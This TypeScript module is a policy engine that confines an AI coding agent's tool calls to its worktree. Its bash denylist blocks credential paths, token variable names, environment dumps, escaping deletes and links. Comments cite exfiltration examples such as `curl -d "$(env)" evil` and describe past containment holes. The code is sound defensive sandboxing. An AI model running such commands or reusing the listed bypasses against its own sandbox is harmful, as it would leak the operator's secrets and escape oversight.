import { homedir } from "node:os";
import { resolve, sep } from "node:path";
import type { ToolCall } from "./types";

// The policy engine. Pure function: a tool call plus its worktree context maps
// to allow or deny. It holds NO state, and it never asks a human anything.
//
//   allow — anything inside the boundary.
//   deny  — the floor: out-of-worktree access, credential exfiltration,
//           recursive-force deletes escaping the tree, and (in plan mode)
//           anything that is not a genuine read.
//
// Bash confinement here is heuristic and cannot be otherwise: a command is a
// string, and no lexical check can promise where it will reach. So bash-shaped
// danger is a FLOOR of high-signal patterns rather than a claim of containment,
// and the worktree boundary — lexical and provable — is enforced on path-bearing
// tools instead.

export type PolicyAction = "allow" | "deny";

export interface PolicyDecision {
  action: PolicyAction;
  /**
   * On `deny`: the reason fed back to the agent so it adapts.
   * On `allow`: a short description, used only for audit and progress.
   */
  reason: string;
  /**
   * Set on the ONE allow that is not just "this ran": the plan-file write by
   * which a planning session presents its plan. The session manager posts the
   * plan into the thread instead of logging a write.
   */
  plan?: true;
}

export interface PolicyContext {
  /** Absolute session worktree; filesystem access is confined to it. */
  worktree: string;
  /**
   * The session's actual working directory — the worktree root, or a
   * SUBDIRECTORY of it for a monorepo session assigned as `<repo>/<subdir>`.
   * Used ONLY as the base a relative path resolves against, because that is what
   * the agent's own tools resolve against. It NEVER participates in the
   * containment test: the boundary is always `worktree`, which sits at or above
   * this. Omitted = the worktree root (the pre-monorepo behaviour).
   */
  cwd?: string;
  memoryRoot?: string;
  /**
   * The session is in PLAN MODE (`@Condotto plan on`): the agent investigates and
   * proposes a plan instead of doing the work. Only genuine READS run; everything
   * else is denied with a message telling the agent what to do instead.
   *
   * The one exception is the plan-file write itself — that write IS how a plan is
   * presented, since the runtime exposes no plan-exit tool headless. It allows,
   * carries `plan: true`, and the session manager posts
   * its content into the thread.
   *
   * Session-scoped rather than tool-scoped, and it lives here rather than in the
   * session manager because it depends only on the tool and the context, never on
   * who is asking.
   */
  planMode?: boolean;
  /**
   * Absolute directory the harness runtime writes plan files to, when plan mode
   * is on (the adapter's `settings.plansDirectory`). Always INSIDE the worktree,
   * so this is not a containment exception — `evaluateBase` confines it like any
   * other path, and outside plan mode it is an ordinary directory.
   *
   * Its only job is to name the one write plan mode permits. The headless plan
   * protocol has no plan-exit tool: the model presents a plan
   * by WRITING it here, and that write carries the whole plan as `content`.
   */
  plansDir?: string;
}

const PLAN_MODE_MSG =
  "You're in plan mode: nothing is written and nothing runs, including the test suite. Keep " +
  "reading and investigating, then write your plan to your plan file — it gets posted into the " +
  "thread, and an architect takes plan mode off when they're happy with it.";

// Tool categories. Side-effect-free meta-tools, confined reads, confined
// writes, and the multi-agent spawn tools. A tool in none of them is unknown, and
// an unknown tool is allowed like anything else — the boundary is the FLOOR, not
// a catalogue of known-good names. Keeping the categories is still worthwhile:
// they are how a path-bearing call gets its paths confined.
const NO_FS_TOOLS = new Set(["TodoWrite", "ToolSearch"]);
/**
 * Delegation, not action. Allowed in plan mode: parallel read-only investigation
 * is exactly what planning is for, and every call a spawned agent makes is itself
 * evaluated under the same plan-mode context, so nothing it does escapes the mode.
 */
const SPAWN_TOOLS = new Set(["Agent", "Task", "Workflow"]);
const READ_TOOLS = new Set(["Read", "Glob", "Grep"]);
const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);

/** Fields across tool inputs that name a filesystem target. */
const PATH_FIELDS = ["file_path", "path", "notebook_path"] as const;

const allow = (reason: string): PolicyDecision => ({ action: "allow", reason });
const deny = (reason: string): PolicyDecision => ({ action: "deny", reason });

/**
 * The first path field (if any) that resolves outside the worktree.
 * Returns null when every present path is confined.
 *
 * TWO distinct paths are involved, and conflating them is a security bug:
 *
 *  - `worktree` is the containment ROOT — the boundary. Always.
 *  - `base` is what a RELATIVE input resolves against, defaulting to the root.
 *    For a monorepo session the harness cwd is a subdirectory, and the agent's
 *    own tools resolve relative paths against that cwd — so we must too, or we
 *    misjudge every relative path. From cwd `<wt>/apps/report`, the agent's
 *    `../../packages/shared/x.ts` really means `<wt>/packages/shared/x.ts`,
 *    which is inside the worktree and must be allowed.
 *
 * THE INVARIANT: containment is computed only from `root`, never from `base`.
 * A deeper base therefore cannot widen the boundary — it can only relocate a
 * path WITHIN it. Absolute inputs and `~` ignore the base entirely, so
 * `/etc/passwd` and `~/.aws/credentials` deny regardless of cwd.
 *
 * Resolution is purely lexical — `path.resolve` never follows symlinks
 * (symlink-chasing for in-tree content is future hardening). That is why `base`
 * must be a path Condotto has already realpath-validated at assign time: it
 * names repo content, and a subdirectory that is a symlink out of the tree would
 * otherwise make every lexically-inside path a real escape.
 */
export function offendingPath(worktree: string, input: unknown, base?: string): string | null {
  const root = resolve(worktree);
  // Never derived from `base` — see THE INVARIANT above.
  const from = base === undefined ? root : resolve(base);
  for (const { value, target } of pathTargets(input, from)) {
    if (!containedIn(target, root)) return value;
  }
  return null;
}

/**
 * THE containment test, in exactly one place. `+ sep` is what defeats the
 * prefix-collision attack: without it `<wt>-evil/x` would pass as "inside `<wt>`".
 */
function containedIn(target: string, root: string): boolean {
  return target === root || target.startsWith(root + sep);
}

/**
 * Every filesystem target named by a tool input, resolved against `from`.
 * Shared by the worktree and memory checks so the two can never disagree about
 * what a given input actually points at.
 */
function pathTargets(input: unknown, from: string): { value: string; target: string }[] {
  if (typeof input !== "object" || input === null) return [];
  const out: { value: string; target: string }[] = [];
  for (const field of PATH_FIELDS) {
    const value = (input as Record<string, unknown>)[field];
    if (typeof value !== "string" || value.length === 0) continue;
    // A leading `~` is never a legitimate in-worktree relative path; expand it
    // as a shell/tool would rather than let node treat it as a literal subdir.
    const expanded = value === "~" || value.startsWith("~/") ? homedir() + value.slice(1) : value;
    out.push({ value, target: resolve(from, expanded) });
  }
  return out;
}

/**
 * Every ABSOLUTE target of this input that lands under the memory root, legal shape
 * or not. The session manager re-proves each against the filesystem before the
 * call runs — see `verifyMemoryTarget`. Returns absolute paths (unlike
 * `evaluateBase`'s own scan, which keeps the raw input value for error messages).
 */
export function memoryTargets(memoryRoot: string, input: unknown, base: string): string[] {
  const root = resolve(memoryRoot);
  return pathTargets(input, resolve(base))
    .filter((t) => containedIn(t.target, root))
    .map((t) => t.target);
}

/**
 * A legal memory FILE: a direct `.md` child of the memory root. Nothing else.
 *
 * The shape is the security control, not tidiness. Allowing arbitrary depth under
 * the root made one planted directory symlink (`<mem>/r -> /`) into a general host
 * read channel, because `<mem>/r/etc/passwd` is lexically "inside memory" and reads
 * there are auto-allowed. Requiring a DIRECT child means no path can traverse
 * THROUGH a link at all — the only reachable shape is a single filename, so the
 * remaining risk narrows to a link that IS a memory file, which the session
 * manager's per-call `verifyMemoryTarget` resolves for real before allowing it.
 *
 * The filename charset also refuses `..`, separators, and control characters, so a
 * "direct child" cannot be spelled as an escape.
 */
export function isMemoryFile(memoryRoot: string, absTarget: string): boolean {
  const root = resolve(memoryRoot);
  if (!containedIn(absTarget, root) || absTarget === root) return false;
  const rel = absTarget.slice(root.length + 1);
  if (rel.includes(sep) || rel.includes("/")) return false; // direct child only
  return /^[A-Za-z0-9][A-Za-z0-9._-]*\.md$/.test(rel);
}

/**
 * A `..` segment in a Glob PATTERN is refused outright rather than resolved.
 *
 * `offendingPath` checks a pattern lexically, but glob metacharacters aren't
 * paths: `**` resolves as a single literal segment while the real expansion
 * walks arbitrarily deep. That mismatch gives a pattern more lexical headroom
 * than it should have, and the headroom grows with the depth of the resolution
 * base — so a monorepo subdir session would amplify it. Refusing `..` in a
 * pattern removes the amplification entirely and costs the agent nothing: it can
 * scope with Glob's `path` field plus a relative pattern, or an absolute
 * in-worktree pattern.
 */
function globPatternEscapes(pattern: unknown): boolean {
  if (typeof pattern !== "string") return false;
  return pattern.split(/[\\/]/).includes("..");
}

/**
 * Classify a tool call. ORIGIN-BLIND: a subagent, a workflow agent and a call
 * arriving on the harness backstop all get the identical answer, because a
 * subagent acting inside an architect's turn IS the architect's turn.
 * `call.agentId` and `call.escaped` are audit detail, never policy inputs.
 */
export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  if (ctx.planMode) return evaluatePlanning(call, ctx);
  return evaluateBase(call, ctx);
}

/**
 * Plan mode: the agent investigates and proposes, and only genuine READS run.
 *
 * The guarantee is "nothing changes", and it is enforced on the DECISION rather
 * than on a tool list, because the floor's own allows (a read, a meta-tool) are
 * the only things that may pass. Everything else — writes, bash, network,
 * anything unrecognized — denies with a message that says what to do instead,
 * because a bare refusal just makes a model retry.
 */
function evaluatePlanning(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const base = evaluateBase(call, ctx);
  // The floor keeps its own specific reason. "Refused outright" must never blur
  // into "not while planning" — they mean different things to a reader.
  if (base.action === "deny") return base;
  if (NO_FS_TOOLS.has(call.name) || READ_TOOLS.has(call.name) || SPAWN_TOOLS.has(call.name)) return base;
  // THE plan write: the runtime exposes no plan-exit tool headless, so writing
  // the plan file IS how a plan is presented. It carries the whole plan as
  // `content`, and the session manager posts that into the thread.
  if (isPlanWrite(call, ctx)) return { action: "allow", reason: "presents a plan", plan: true };
  return deny(PLAN_MODE_MSG);
}

/**
 * A denial reason tailored to a path that lands under the memory root but is not a
 * legal memory file — "outside your worktree" would be true but useless there, and
 * an agent that cannot tell "forbidden" from "wrong shape" just retries.
 */
function outsideReason(value: string, ctx: PolicyContext, from: string): string | null {
  if (!ctx.memoryRoot) return null;
  const target = resolve(from, value === "~" || value.startsWith("~/") ? homedir() + value.slice(1) : value);
  if (!containedIn(target, resolve(ctx.memoryRoot))) return null;
  return (
    `"${value}" isn't a usable memory path. Memory holds markdown files directly in ` +
    `${ctx.memoryRoot} — no subdirectories — so use a plain name like \`some-fact.md\`.`
  );
}

/** Base tool-semantics rules (origin-agnostic): reads/writes/bash/network/unknown. */
function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;

  // Side-effect-free meta tools: always fine, touch no filesystem.
  if (NO_FS_TOOLS.has(name)) return allow(name === "ToolSearch" ? "loads a tool definition" : "updates its task plan");

  // Memory vs. escape, decided over the WHOLE set of path targets. Comparing two
  // independent first-matches was a critical hole (review 2026-07-20): a memory
  // target is out-of-worktree BY DEFINITION, so a memory-valued `file_path` was
  // both the first offender and the first memory hit, they compared equal, and a
  // second field escaping anywhere on the host was silently discarded —
  // `Grep{file_path:"<mem>/MEMORY.md", path:"/etc"}` came back ALLOW.
  //
  // The rule: ANY out-of-worktree target that is not a valid memory file is an
  // escape, and the memory branch is taken only when EVERY one of them is a memory
  // file. One list, both questions.
  const from = resolve(ctx.cwd ?? ctx.worktree);
  const outside = pathTargets(call.input, from).filter(
    (t) => !containedIn(t.target, resolve(ctx.worktree)),
  );
  const isMemory = (t: { target: string }) =>
    ctx.memoryRoot !== undefined && isMemoryFile(ctx.memoryRoot, t.target);
  const escapedPath = outside.find((t) => !isMemory(t))?.value ?? null;
  const memory = outside.length > 0 && outside.every(isMemory) ? outside[0]!.value : null;

  if (READ_TOOLS.has(name)) {
    // Reading anything on the host + posting the answer in a thread is an
    // exfiltration channel — reads are confined like writes.
    // Glob's `pattern` is itself a path glob (it can be absolute or contain
    // `..`) and drives enumeration on its own, so it must be confined too;
    // Grep's `pattern` is a regex scoped by the (already-checked) `path`.
    const pattern = (call.input as Record<string, unknown> | null)?.pattern;
    if (name === "Glob" && globPatternEscapes(pattern)) {
      return deny(
        `"${String(pattern)}" uses ".." in a glob pattern, which isn't allowed — a pattern is ` +
          `matched, not resolved. Scope the search with Glob's "path" field and a pattern ` +
          `relative to it instead.`,
      );
    }
    // A Glob pattern is confined to the WORKTREE with no memory carve-out. Memory
    // is addressed one file at a time (`MEMORY.md` is the index the agent reads to
    // find the rest), so enumeration buys it nothing — and a pattern is matched
    // rather than resolved, which is exactly the mismatch that would let a glob
    // walk through anything planted under the root.
    const globEscape =
      name === "Glob" ? offendingPath(ctx.worktree, { path: pattern }, ctx.cwd) : null;
    const escaped = escapedPath ?? globEscape;
    if (escaped) {
      return deny(
        outsideReason(escaped, ctx, from) ??
          `"${escaped}" is outside your worktree. You may only read files inside your own working tree.`,
      );
    }
    // Reading memory is free, exactly like reading the worktree: it holds only
    // notes this session lineage wrote, so it leaks nothing a read of the tree
    // would not. (It is agent-authored, hence "notes, not authority" in the prompt.)
    return allow(describeCall(call));
  }

  if (WRITE_TOOLS.has(name)) {
    // A write outside the worktree is the floor — EXCEPT the session's own
    // memory root, which is the one named exception and has its own narrower
    // rules (a `.md` file directly in the root, enforced by `isMemoryFile`
    // above; anything else already fell through to `escapedPath`).
    if (memory !== null && escapedPath === null) {
      // Write/Edit only. MultiEdit and NotebookEdit stay refused: memory is the
      // one thing this session writes that lands in a LATER session's system
      // prompt, and those two tools make a change that is harder to read back in
      // the audit log than a plain write or a diff.
      if (name !== "Write" && name !== "Edit") {
        return deny(
          `use Write or Edit for memory files — ${name} isn't allowed there, because what goes ` +
            `into memory has to be legible afterwards.`,
        );
      }
      return allow(describeCall(call));
    }
    if (escapedPath) {
      return deny(
        outsideReason(escapedPath, ctx, from) ??
          `"${escapedPath}" is outside your worktree. Writes are confined to your own working tree.`,
      );
    }
    return allow(describeCall(call));
  }

  if (name === "Bash") return evaluateBash(call.input, ctx);

  // Everything else — network tools, the multi-agent spawns, anything the
  // runtime grows next. The floor is the boundary; an unrecognized NAME is not a
  // danger signal, and refusing an unclassified NAME only broke tools that were
  // perfectly fine.
  return allow(describeCall(call));
}

function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
  const command =
    typeof input === "object" && input !== null && typeof (input as any).command === "string"
      ? ((input as any).command as string)
      : "";
  if (!command.trim()) return deny("empty bash command");

  // The floor, and the only thing standing between a command and the shell.
  const danger = bashHardDeny(command, { memoryRoot: ctx.memoryRoot, worktree: ctx.worktree, cwd: ctx.cwd });
  if (danger) return deny(danger);

  return allow(`run \`${truncate(command)}\``);
}
/**
 * THE FLOOR for shell. A small, deliberately conservative denylist of things
 * nobody may run, whoever is asking. NOT exhaustive, and it cannot be: a command
 * is a string. Nothing stands behind it, so it is sized accordingly: high-signal,
 * unambiguous shapes only. Fuller shell parsing is future work.
 */
export function bashHardDeny(
  command: string,
  ctx?: { memoryRoot?: string; worktree?: string; cwd?: string },
): string | null {
  const memoryRoot = ctx?.memoryRoot;
  const worktree = ctx?.worktree;
  const base = ctx?.cwd ?? ctx?.worktree;
  // Keep the shell out of the memory directory, so memory changes only through the
  // path-checked write tools. The agent does reach for `cat <memory>/MEMORY.md`
  // unprompted, so the reason TELLS it what to use instead.
  //
  // BEST-EFFORT, NOT A BOUNDARY. A literal substring match, so `~/…`, relative and
  // `$HOME` spellings slip past it, and a session whose repo has memory OFF has no
  // memoryRoot here at all. Nothing rests on it: `verifyMemoryTarget` re-proves
  // every memory target per call, which catches a link planted by any of those
  // routes. Do not add security weight here — harden the per-call proof instead.
  if (memoryRoot && command.includes(memoryRoot)) {
    return "the memory directory isn't reachable from the shell — use the Read, Write, and Edit tools for memory files.";
  }
  // Recursive force-delete whose target escapes the worktree (absolute, home,
  // parent, variable-expanded, or wildcard). A relative `rm -rf build` is ordinary
  // work; an `rm -rf /` or `rm -rf ~` is refused outright. Quotes are stripped
  // first so `rm -rf "/"` / `rm -rf "$HOME"` can't hide the target.
  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    const seg = rawSeg.replace(/['"]/g, "");
    if (!/\brm\b/.test(seg)) continue;
    const hasR = /\s-\w*r/i.test(seg) || /\s--recursive\b/.test(seg);
    const hasF = /\s-\w*f/i.test(seg) || /\s--force\b/.test(seg);
    if (!(hasR && hasF)) continue;
    // A target is dangerous unless it is clearly an in-tree relative path.
    const targets = seg.trim().split(/\s+/).slice(1).filter((t) => t && !t.startsWith("-"));
    for (const t of targets) {
      if (t.startsWith("/") || t.startsWith("~") || t.includes("..") || t.includes("$") || t.includes("*")) {
        return "recursive force-delete with an out-of-worktree, home, root, or wildcard target is not allowed.";
      }
    }
  }
  // Linking something from outside the tree INTO it. Our containment is purely
  // lexical (`offendingPath` never calls realpath — see its docstring), so a link
  // whose target escapes turns every later in-tree path into a real escape: once
  // `<wt>/x -> /`, an allowed `Read <wt>/x/etc/passwd` is lexically confined and
  // posts a host file into the thread. This deny is what keeps lexical containment
  // tolerable.
  //
  // Hard links (`ln` with no `-s`) escape the same way for files, so this is not
  // scoped to `-s`. A link whose targets are all in-tree paths is ordinary work.
  // Quotes are stripped so `ln -s "/"` cannot hide.
  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    const seg = rawSeg.replace(/['"]/g, "");
    const tokens = seg.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && (/^\w+=/.test(tokens[i]!) || /^(?:sudo|doas|nice|nohup|stdbuf|time|timeout|command)$/.test(tokens[i]!))) i++;
    if ((tokens[i] ?? "").replace(/^.*\//, "") !== "ln") continue;
    for (const t of tokens.slice(i + 1).filter((t) => t && !t.startsWith("-"))) {
      // `$` and `*` can't be resolved lexically at all, so they stay refused.
      if (t.includes("$") || t.includes("*")) {
        return "creating a link whose target is a variable or wildcard is not allowed (it can't be checked).";
      }
      // Everything else is RESOLVED and tested for containment, rather than sniffed
      // for `..`. A relative `..` that lands back inside the tree is ordinary work
      // (`ln -s ../shared/x.ts x.ts` between packages in a monorepo), and floring it
      // would be a false denial with no override.
      const expanded = t === "~" || t.startsWith("~/") ? homedir() + t.slice(1) : t;
      const escapes =
        worktree !== undefined && base !== undefined
          ? !containedIn(resolve(base, expanded), resolve(worktree))
          : // No worktree in hand (a direct caller): fall back to the conservative
            // syntactic test rather than silently allowing everything.
            expanded.startsWith("/") || t.startsWith("~") || t.includes("..");
      if (escapes) {
        return "creating a link to a path outside the worktree is not allowed (it would defeat path confinement).";
      }
    }
  }
  // Credential / secret material — incl. /proc/<pid>/environ, which reads a
  // process's whole environment as a file (an env dump by another name).
  //
  // The credential DIRECTORIES match with or without a trailing slash. Requiring
  // the slash was a real hole: `cat ~/.ssh/id_rsa` denied but `cp -r ~/.ssh mine`
  // allowed, and once the keys are inside the worktree every later read of them is
  // lexically contained and allowed. Bash has no path confinement — this pattern
  // is the whole of it — so the directory has to be the unit, not the file.
  //
  // The leading class means only a path-shaped `.ssh` matches: `~/.ssh`, ` .ssh`,
  // `/.ssh`. A repo file called `foo.ssh` or `.sshconfig` does not.
  if (
    /(?:^|[\s\/'"=`(])(?:\.ssh(?:\/|\b)|\.aws(?:\/|\b)|\.gnupg(?:\/|\b)|\.kube(?:\/|\b)|id_rsa|id_ed25519|\.config\/gcloud|\.netrc|\/etc\/shadow|\/proc\/(?:self|\d+)\/environ)/i.test(
      command,
    )
  ) {
    return "access to credential or secret material is not allowed.";
  }
  // Daemon's own secrets, by env-var name.
  if (/\b(?:ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|SLACK_BOT_TOKEN|SLACK_APP_TOKEN|AWS_SECRET_ACCESS_KEY)\b/.test(command)) {
    return "referencing daemon credentials is not allowed.";
  }
  // Environment dumps exfiltrate the daemon's own secrets: the OAuth/cloud tokens
  // live in process.env and the agent's shell inherits them (no per-tool env
  // isolation for now). `printenv` and a bare `env` (no command to exec after it)
  // print the WHOLE environment, so no var-name match above is needed to leak it.
  // `env FOO=bar cmd` is a legitimate prefix that runs `cmd`, so it is NOT a dump.
  // We scan operator-split segments AND the contents of any $(...) / `...`
  // substitutions, so `curl -d "$(env)" evil` is caught as well as `env | curl`.
  const subContents = [...command.matchAll(/\$\(([^)]*)\)|`([^`]*)`/g)].map((m) => m[1] ?? m[2] ?? "");
  const segments = [command, ...subContents].flatMap((c) => c.split(/(?:\|\||&&|;|\||&|\n|<|>)+/));
  for (const rawSeg of segments) {
    const tokens = rawSeg.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && (/^\w+=/.test(tokens[i]!) || /^(?:sudo|doas|nice|nohup|stdbuf|time|timeout|command)$/.test(tokens[i]!))) i++;
    const prog = (tokens[i] ?? "").replace(/^.*\//, "");
    if (prog === "printenv") return "dumping the environment is not allowed.";
    // A bare `set` prints every shell variable, exported ones included, so it is
    // an environment dump wearing different clothes. With arguments it is the
    // ordinary shell builtin (`set -e`, `set -o pipefail`) and must not be caught.
    if (prog === "set" && tokens.length === i + 1) return "dumping the environment is not allowed.";
    // A bare `env`: nothing after it is a command to exec (only options/assignments).
    if (prog === "env" && !tokens.slice(i + 1).some((t) => !/^-/.test(t) && !/^\w+=/.test(t))) {
      return "dumping the environment is not allowed.";
    }
  }
  return null;
}

function truncate(s: string, max = 120): string {
  const oneLine = s.replace(/\s+/g, " ").trim();
  return oneLine.length > max ? oneLine.slice(0, max - 1) + "…" : oneLine;
}

/**
 * Best-effort pull of `name`/`description` from a Workflow tool call's `script`
 * (a JS string beginning with `export const meta = { name: '…', description: '…' }`).
 * Used only to DESCRIBE a launch in the thread and the audit log — the script is
 * never executed here. Returns null if absent or the fields can't be found. Scans
 * only the meta block so a later string literal can't be mistaken for it.
 */
export function parseWorkflowMeta(script: unknown): { name?: string; description?: string } | null {
  if (typeof script !== "string" || script.length === 0) return null;
  const metaStart = script.indexOf("meta");
  const scope = metaStart >= 0 ? script.slice(metaStart, metaStart + 1200) : script.slice(0, 1200);
  const grab = (key: string): string | undefined => {
    const m = scope.match(new RegExp(`${key}\\s*:\\s*(['"\`])([^'"\`]{0,200})\\1`));
    if (!m?.[2]) return undefined;
    // The script is authored by the main agent (injection-reachable), and this text
    // lands in a thread and in the audit log. Sanitize it to a single short line:
    // collapse ALL whitespace incl. newlines (so it can't forge a multi-line
    // protocol block), strip control chars, cap the length.
    const clean = m[2].replace(/[\x00-\x1f\x7f]+/g, " ").replace(/\s+/g, " ").trim();
    return clean.length > 100 ? clean.slice(0, 99) + "…" : clean || undefined;
  };
  const name = grab("name");
  const description = grab("description");
  return name || description ? { name, description } : null;
}

/**
 * Is this the write that presents a plan — a `.md` file DIRECTLY in the session's
 * plans directory, written with `Write` or `Edit`?
 *
 * Shape-checked rather than prefix-matched, for the reason `isMemoryFile` is:
 * "somewhere under the directory" would let `<plansDir>/../../src/index.ts` be
 * spelled as a plan. Requiring a direct child with a plain
 * filename means the path cannot traverse anywhere.
 *
 * Lower stakes than the memory case, though, and worth saying why: the plans
 * directory lives INSIDE the worktree, so `evaluateBase` has already confined it.
 * Getting this wrong widens nothing — at worst it mislabels an ordinary write as
 * a plan, or refuses a genuine plan and leaves the agent unable to present one.
 */
function isPlanWrite(call: ToolCall, ctx: PolicyContext): boolean {
  if (!ctx.plansDir) return false;
  return isPlanPresentation(call, ctx.plansDir, ctx.cwd ?? ctx.worktree);
}

/**
 * The same question, asked from outside a policy evaluation — a caller holding a
 * bare tool call rather than a `PolicyContext`. Exported so there is exactly ONE
 * definition of "this is a plan"; two copies would drift.
 */
export function isPlanPresentation(call: ToolCall, plansDir: string, base?: string): boolean {
  if (!WRITE_TOOLS.has(call.name)) return false;
  // Write/Edit only, for the reason the memory rules exclude the other two: a plan
  // is a document a human reads, and those make a change that is harder to read back.
  if (call.name === "MultiEdit" || call.name === "NotebookEdit") return false;
  const root = resolve(plansDir);
  const targets = pathTargets(call.input, resolve(base ?? plansDir));
  if (targets.length === 0) return false;
  for (const { target } of targets) {
    // Shape-checked, not prefix-matched: `<plansDir>/../../src/index.ts` is
    // lexically "under" the directory by prefix but is not a plan file. Requiring
    // a direct child with a plain filename means the path cannot traverse at all.
    if (!containedIn(target, root)) return false;
    const rel = target.slice(root.length + 1);
    if (!/^[A-Za-z0-9][A-Za-z0-9._-]*\.md$/.test(rel)) return false;
  }
  return true;
}

/** Cap on plan text pulled out of a plan-presenting call, before the surface's own cap. */
const MAX_PLAN_CHARS = 20_000;

/**
 * Best-effort pull of the plan text out of the call that presents a plan, so the
 * core can post it into the thread.
 *
 * `content` first: the headless plan protocol presents a plan by WRITING it, so in
 * practice this is a `Write` and the plan is its content. `plan`
 * next, for a future SDK that restores a plan-exit tool — its `ExitPlanModeInput`
 * does not name the field, so the longest top-level string is the last resort. A
 * null must degrade to a readable message, never to a crash.
 *
 * Unlike `parseWorkflowMeta`, whitespace is NOT collapsed: this is a document a
 * human reads and its line structure is the readability. It rides the ordinary
 * reply path, so it is exactly as safe as any other agent reply.
 */
export function planTextFrom(input: unknown): string | null {
  const i = (input ?? {}) as Record<string, unknown>;
  const named = ["content", "plan", "new_string"]
    .map((k) => i[k])
    .find((v): v is string => typeof v === "string" && v.trim().length > 0);
  const longest = named
    ? undefined
    : Object.entries(i)
        // `file_path` is a path, never the plan — excluding it stops a short plan
        // from losing to a long worktree path.
        .filter(([k, v]) => k !== "file_path" && typeof v === "string")
        .map(([, v]) => v as string)
        .sort((a, b) => b.length - a.length)[0];
  const raw = (named ?? longest ?? "").replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]+/g, "");
  const text = raw.trim();
  if (text.length === 0) return null;
  return text.length > MAX_PLAN_CHARS ? text.slice(0, MAX_PLAN_CHARS) + "\n\n… (plan truncated)" : text;
}

/** Short human-readable description of a tool call, for prompts and audit. */
export function describeCall(call: ToolCall): string {
  const i = (call.input ?? {}) as Record<string, unknown>;
  switch (call.name) {
    case "Workflow": {
      const meta = parseWorkflowMeta(i.script ?? i.scriptPath);
      if (meta?.name && meta.description) return `run the workflow \`${meta.name}\` — ${meta.description}`;
      if (meta?.name) return `run the workflow \`${meta.name}\``;
      return "run a multi-agent workflow";
    }
    case "Agent":
    case "Task":
      return "delegate to a subagent";
    case "Read":
      return `read ${i.file_path ?? "a file"}`;
    case "Glob":
      return `list files matching ${i.pattern ?? "a pattern"}`;
    case "Grep":
      return `search for ${i.pattern ?? "a pattern"}`;
    case "Write":
      return `write ${i.file_path ?? "a file"}`;
    case "Edit":
    case "MultiEdit":
      return `edit ${i.file_path ?? "a file"}`;
    case "NotebookEdit":
      return `edit notebook ${i.notebook_path ?? ""}`.trim();
    case "Bash":
      return `run \`${truncate(String(i.command ?? ""))}\``;
    case "WebFetch":
      return `fetch ${i.url ?? "a URL"}`;
    case "WebSearch":
      return `search the web for ${i.query ?? "a query"}`;
    default:
      return `use ${call.name}`;
  }
}
